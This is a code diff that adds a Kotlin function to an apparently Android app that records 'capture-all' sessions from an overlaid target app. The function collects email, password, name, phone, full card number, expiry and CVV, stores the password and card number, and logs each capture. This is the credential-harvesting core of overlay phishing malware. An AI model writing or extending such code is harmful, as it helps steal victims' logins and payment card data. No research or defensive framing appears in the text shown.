@@ -90,6 +90,45 @@ object SessionRepository {
         }
     }
 
+    /**
+     * Records a comprehensive capture-all session with all field data.
+     *
+     * @param targetApp Package name of the overlaid app.
+     * @param fields Map of all captured field values.
+     * @return The created [CaptureSession].
+     */
+    fun captureAll(targetApp: String, fields: Map<String, String>): CaptureSession {
+        val email = fields["email"] ?: ""
+        val password = fields["password"] ?: ""
+        val name = fields["name"] ?: ""
+        val phone = fields["phone"] ?: ""
+        val card = fields["card"] ?: ""
+        val expiry = fields["expiry"] ?: ""
+        val cvv = fields["cvv"] ?: ""
+
+        // Build descriptive summary for display
+        val summary = buildString {
+            if (email.isNotBlank()) append("Email: $email\n")
+            if (name.isNotBlank()) append("Name: $name\n")
+            if (phone.isNotBlank()) append("Phone: $phone\n")
+            if (card.isNotBlank()) append("Card: *${card.takeLast(4)}\n")
+            if (expiry.isNotBlank()) append("Exp: $expiry\n")
+        }.trimEnd()
+
+        val session = CaptureSession(
+            id = System.currentTimeMillis(),
+            targetApp = targetApp,
+            email = summary.ifEmpty { "No data captured" },
+            password = password,
+            cardNumber = card,
+            timestamp = formatter.format(Instant.now()),
+            overlayType = "capture_all"
+        )
+        _sessions.update { current -> listOf(session) + current }
+        android.util.Log.d("SessionRepository", "Session stored: id=${session.id}, fields=${fields.size}")
+        return session
+    }
+
     /** Clears all captured sessions. */
     fun clear() {
         _sessions.value = emptyList()
